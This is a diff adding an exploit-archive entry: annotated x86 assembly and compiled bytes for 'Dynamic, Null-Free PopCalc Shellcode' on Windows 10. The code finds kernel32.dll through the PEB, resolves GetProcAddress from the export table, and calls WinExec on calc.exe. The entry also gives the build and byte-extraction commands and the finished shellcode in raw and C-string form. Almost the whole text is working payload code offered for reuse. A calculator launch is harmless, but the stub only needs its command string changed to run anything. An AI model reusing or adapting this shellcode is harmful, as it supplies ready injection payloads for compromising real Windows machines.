@@ -1,0 +1,147 @@
+id: 33992
+date: 02/20/2020
+title: Windows/10 Pro - Dynamic Null-Free PopCalc Shellcode (223 bytes)
+author: Bobby Cooke
+cves: 
+
+; Shellcode Title:  Dynamic, Null-Free PopCalc Shellcode (223 Bytes)
+; Shellcode Author: Bobby Cooke
+; Technique:        PEB & Export Directory Table
+; Tested On:        Windows 10 Pro (x86) 10.0.18363 Build 18363
+
+# Create a new stack frame
+ push ebp                ; push current base pointer to the stack
+ mov ebp, esp            ; Set Base Stack Pointer for new Stack-Frame
+ sub esp, 0x30           ; Decrement the stack by 96 to create space for saving pointers 
+
+# Push string "GetProcAddress",0x00 onto the stack
+ xor eax, eax            ; clear eax register
+ mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
+ push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"      
+ push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
+ push 0x41636f72         ; Acor : 41636f72
+ push 0x50746547         ; PteG : 50746547
+ mov [ebp-0x4], esp      ; save PTR to string at bottom of stack (ebp)
+
+# Find Base Address of the kernel32.dll Dynamically Linked Library
+ xor eax, eax            ; clear eax register
+ mov eax, [fs:eax+0x30]  ; EAX = Address_of_PEB
+ mov eax, [eax+0xc]      ; EAX = Address_of_LDR
+ mov eax, [eax+0x1c]     ; EAX = First Entry of InInitialzationOrderModuleList - ntdll.dll
+ mov ebx, eax            ; Get the second entry in the Initialization Order Module List (kernelbase.dll)
+ mov eax, [ebx]          ; EAX = Second Entry of InInitialzationOrderModuleList - kernelbase.dll
+ mov ebx, eax            ; Get the third entry in the Initialization Order Module List (kernel32.dll)
+ mov eax, [ebx]          ; EAX = Third Entry of InInitialzationOrderModuleList - kernel32.dll
+ mov eax, [eax+0x8]      ; move the kernel32.dll base address into the EAX register
+                         ; EAX = Base address of kernel32.dll
+ mov [ebp-0x8], eax      ; Save the base address of kernel32.dll in the 2nd from bottom position on our stack
+
+# Find Base Address of GetProcAddress Symbol
+ mov ebx, [eax+0x3c]     ; save Relative Virtual Address (RVA/Offset) of New_Exe_Header to ebx.
+ add ebx, eax            ; EBX = Address of new  Header
+ mov ebx, [ebx+0x78]     ; (RVA of New Exe Header) + 0x78 = RVA of Export-Table
+ add ebx, eax            ; EBX now holds the address of the Export Table for kernel32.dll
+ mov edi, [ebx+0x20]     ; PTR to RVA of Name-Pointer Table
+ add edi, eax            ; (kernel32.dll baseAddr) + (RVA Name-Pointer Table) = Address of Name-Pointer Table
+ mov [ebp-0xC], edi      ; save Address of Name-Pointer Table in the 3rd from bottom position in our stack-frame
+ mov ecx, [ebx+0x24]     ; PTR to RVA of Ordinal Table
+ add ecx, eax            ; (kernel32.dll baseAddr) + (RVA Ordinal Table) = Address of Ordinal Table
+ mov [ebp-0x10], ecx     ; save PTR to Ordinal Table Address at 4th from bottom of stack (ebp-16)
+ mov edx, [ebx+0x1c]     ; PTR to RVA of Address Table
+ add edx, eax            ; (kernel32.dll baseAddr) + (RVA Address Table) = Address of Address Table
+ mov [ebp-0x14], edx     ; save PTR to Address Table Address at 5th from bottom of stack (ebp-20)
+ mov edx, [ebx+0x14]     ; Value of Number of Functions/Symbols within the Tables
+ xor eax, eax            ; Counter = 0
+loop:
+ mov edi, [ebp-0xC]      ; Address of the Name-Pointer Table
+ mov esi, [ebp-0x4]      ; PTR to string "GetProcAddress",0x00
+ xor ecx, ecx            ; clear ecx register -- used for counters/loops
+ cld                     ; clear direction flag, DF=0 -- Process strings from left to right
+ mov edi, [edi+eax*4]    ; Entries in Name Pointer Table are 4 bytes long
+                         ; edi = RVA of Nth entry = (Address of Name-Pointer Table) + (Counter * 4)
+ add edi, [ebp-0x8]      ; edi = address of string = (kernel32.dll base addr) + (RVA of Nth entry)
+ add cx, 0xf             ; ecx = length of string to compare = sizeof("GetProcAddress") = 15 (14 Letters + 1 String Terminator Char)
+ repe cmpsb              ; compare first 15 bytes of string. esi cmp edi
+                         ; if equal ZF=1, if not ZF=0
+ jz found                ; if strings match end loop, else increment eax and loop again
+ inc eax                 ; counter ++
+ cmp eax, edx            ; check if eax = Value of Number of Functions/Symbols within the Tables
+ jb loop                 ; If eax != edx, restart the loop
+
+found:
+; The Counter (eax) now holds the position of GetProcAddress within the table
+ mov ecx, [ebp-0x10]     ; ecx = Address of Ordinal Table
+ mov edx, [ebp-0x14]     ; edx = Address of Address Table
+ mov ax, [ecx + eax*2]   ; ax = ordinal number = (Address of Ordinal Table) + (counter * 2)
+ mov eax, [edx + eax*4]  ; eax = RVA of function = var20 + (ordinal * 4)
+ add eax, [ebp-0x8]      ; eax = address of GetProcAddress = (RVA of GetProcAddress) + (kernel32.dll base addr)
+;   Address of GetProcAddress is now in EAX
+ mov [ebp-0x18], eax     ; save Address of GetProcAddress onto Stack 0x18=24; 6th from bottom
+
+; Call GetProcAddress(hModule &kernel32.dll, lpProcName "WinExec")
+;   hModule:    address of the DLL module that contains the function.
+;   lpProcName: A Pointer to the beginning of an ASCII string of the functions name; null terminated.
+ mov edx, 0x63657878     ; "xxec"
+ shr edx, 8              ; edx = "xec",0x00 // shr edx, 8 = Shifts the edx register to the right 8 bits
+ push edx
+ push 0x456e6957         ; EniW : 456e6957
+ push esp                ; $lpProcName -- push the address of the start of the string onto the stack
+ push dword [ebp-0x8]    ; $hModule    -- push base address of kernel32.dll to the stack
+ mov eax, [ebp-0x18]     ; Move the address of GetProcAddress into the EAX register
+ call eax                ; Call the GetProcAddress Function.
+                         ; The address of the queried function is returned into the EAX register.
+ mov [ebp-0x1c], eax     ; save Address of WinExec onto Stack 0x1c=28; 7th from bottom
+
+; Call WinExec( LPCSTR lpCmdLine, UINT uCmdShow );
+;   lpCmdLine = "calc.exe"         # String to program path
+;   uCmdShow  = 0x00000001         # SW_SHOWNORMAL - displays a window
+ xor ecx, ecx          ; clear eax register
+ push ecx              ; string terminator 0x00 for "calc.exe" string
+ push 0x6578652e       ; exe. : 6578652e
+ push 0x636c6163       ; clac : 636c6163
+ mov eax, esp          ; save pointer to "calc.exe" string in eax
+ inc ecx               ; uCmdShow SW_SHOWNORMAL - 0x00000001
+ push ecx              ; uCmdShow *ptr to stack in 2nd position - LIFO
+ push eax              ; lpcmdLine *ptr to stack in 1st position
+ mov eax, [ebp-0x1c]   ; Move the address of WinExec into the EAX register
+ call eax              ; Call the WinExec Function.
+
+; Call GetProcAddress(hModule &kernel32.dll, lpProcName "ExitProcess")
+ xor ecx, ecx
+ mov ecx, 0x73736501     ; 73736501 = "sse",0x01 // "ExitProcess",0x0000 string
+ shr ecx, 8              ; ecx = "ess",0x00 // shr shifts the register right 8 bits
+ push ecx                ;  sse : 00737365 
+ push 0x636f7250         ; corP : 636f7250
+ push 0x74697845         ; tixE : 74697845
+ push esp                ; push pointer to string to stack for 'ExitProcess',0x00
+ push dword [ebp-0x8]    ; push base address of kernel32.dll to stack
+ mov eax, [ebp-0x18]     ; PTR to GetProcAddressA to EAX
+ call eax                ; GetProcAddressA(PTR *kernel32.dll, "ExitProcess"0x00)
+;   EAX = ExitProcess Address
+ mov [ebp-0x20], eax     ; save Address of ExitProcess onto Stack 0x54=84
+
+; Call ExitProcess(ExitCode)
+ xor edx, edx
+ push edx                ; ExitCode = 0
+ mov eax, [ebp-0x20]     ; ExitProcess(ExitCode)
+ call eax
+
+# Compiled on Kali with nasm
+; nasm -f win32 dynaCalc.asm -o dynaCalc.o
+; for i in $(objdump -D dynaCalc.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+; RAW:
+; 5589e583ec3031c066b8737350686464726568726f634168476574508965fc31c0648b40308b400c8b401c89c38b0389c38b038b40088945f88b583c01c38b5b7801c38b7b2001c7897df48b4b2401c1894df08b531c01c28955ec8b531431c08b7df48b75fc31c9fc8b3c87037df86683c10ff3a674054039d072e48b4df08b55ec668b04418b04820345f88945e8ba78786563c1ea08526857696e4554ff75f88b45e8ffd08945e431c951682e6578656863616c6389e04151508b45e4ffd031c9b901657373c1e908516850726f63684578697454ff75f88b45e8ffd08945e031d2528b45e0ffd0
+; Python/C format:
+; "\x55\x89\xe5\x83\xec\x30\x31\xc0\x66\xb8\x73\x73\x50\x68\x64\x64\x72\x65\x68\x72\x6f\x63"
+; "\x41\x68\x47\x65\x74\x50\x89\x65\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b\x40\x1c\x89"
+; "\xc3\x8b\x03\x89\xc3\x8b\x03\x8b\x40\x08\x89\x45\xf8\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01"
+; "\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf4\x8b\x4b\x24\x01\xc1\x89\x4d\xf0\x8b\x53\x1c\x01\xc2"
+; "\x89\x55\xec\x8b\x53\x14\x31\xc0\x8b\x7d\xf4\x8b\x75\xfc\x31\xc9\xfc\x8b\x3c\x87\x03\x7d"
+; "\xf8\x66\x83\xc1\x0f\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf0\x8b\x55\xec\x66\x8b"
+; "\x04\x41\x8b\x04\x82\x03\x45\xf8\x89\x45\xe8\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57"
+; "\x69\x6e\x45\x54\xff\x75\xf8\x8b\x45\xe8\xff\xd0\x89\x45\xe4\x31\xc9\x51\x68\x2e\x65\x78"
+; "\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51\x50\x8b\x45\xe4\xff\xd0\x31\xc9\xb9\x01\x65\x73"
+; "\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\xff\x75\xf8\x8b\x45\xe8"
+; "\xff\xd0\x89\x45\xe0\x31\xd2\x52\x8b\x45\xe0\xff\xd0"
+
+#  0day.today [2023-03-24]  #
